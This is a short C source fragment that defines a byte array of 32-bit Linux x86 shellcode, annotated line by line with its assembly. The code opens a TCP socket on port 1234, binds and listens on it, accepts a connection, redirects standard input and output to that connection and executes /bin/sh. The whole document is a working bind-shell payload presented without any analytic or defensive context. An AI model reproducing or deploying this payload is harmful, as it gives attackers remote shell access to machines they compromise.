
#define BS_SIZE 90

char BS[] = {
  /* 0000 */ "\xb8\xff\xff\xff\xff" /* mov eax, 0xffffffff */
  /* 0005 */ "\xba\xfd\xff\xfb\x2d" /* mov edx, 0x2dfbfffd */
  /* 000A */ "\xf7\xd0"             /* not eax             */
  /* 000C */ "\xf7\xd2"             /* not edx             */
  /* 000E */ "\x50"                 /* push eax            */
  /* 000F */ "\x52"                 /* push edx            */
  /* 0010 */ "\x89\xe5"             /* mov ebp, esp        */
  /* 0012 */ "\x31\xdb"             /* xor ebx, ebx        */
  /* 0014 */ "\xf7\xe3"             /* mul ebx             */
  /* 0016 */ "\xb0\x66"             /* mov al, 0x66        */
  /* 0018 */ "\x43"                 /* inc ebx             */
  /* 0019 */ "\x52"                 /* push edx            */
  /* 001A */ "\x53"                 /* push ebx            */
  /* 001B */ "\x6a\x02"             /* push 0x2            */
  /* 001D */ "\x89\xe1"             /* mov ecx, esp        */
  /* 001F */ "\xcd\x80"             /* int 0x80            */
  /* 0021 */ "\x97"                 /* xchg edi, eax       */
  /* 0022 */ "\x5b"                 /* pop ebx             */
  /* 0023 */ "\x5e"                 /* pop esi             */
  /* 0024 */ "\x6a\x10"             /* push 0x10           */
  /* 0026 */ "\x55"                 /* push ebp            */
  /* 0027 */ "\x57"                 /* push edi            */
  /* 0028 */ "\xb0\x66"             /* mov al, 0x66        */
  /* 002A */ "\x89\xe1"             /* mov ecx, esp        */
  /* 002C */ "\xcd\x80"             /* int 0x80            */
  /* 002E */ "\x89\x51\x04"         /* mov [ecx+0x4], edx  */
  /* 0031 */ "\xb0\x66"             /* mov al, 0x66        */
  /* 0033 */ "\xb3\x04"             /* mov bl, 0x4         */
  /* 0035 */ "\xcd\x80"             /* int 0x80            */
  /* 0037 */ "\xb0\x66"             /* mov al, 0x66        */
  /* 0039 */ "\x43"                 /* inc ebx             */
  /* 003A */ "\xcd\x80"             /* int 0x80            */
  /* 003C */ "\x6a\x02"             /* push 0x2            */
  /* 003E */ "\x59"                 /* pop ecx             */
  /* 003F */ "\x93"                 /* xchg ebx, eax       */
  /* 0040 */ "\x6a\x3f"             /* push 0x3f           */
  /* 0042 */ "\x58"                 /* pop eax             */
  /* 0043 */ "\xcd\x80"             /* int 0x80            */
  /* 0045 */ "\x49"                 /* dec ecx             */
  /* 0046 */ "\x79\xf8"             /* jns 0x40            */
  /* 0048 */ "\x41"                 /* inc ecx             */
  /* 0049 */ "\xb0\x0b"             /* mov al, 0xb         */
  /* 004B */ "\x51"                 /* push ecx            */
  /* 004C */ "\x68\x2f\x2f\x73\x68" /* push 0x68732f2f     */
  /* 0051 */ "\x68\x2f\x62\x69\x6e" /* push 0x6e69622f     */
  /* 0056 */ "\x89\xe3"             /* mov ebx, esp        */
  /* 0058 */ "\xcd\x80"             /* int 0x80            */
};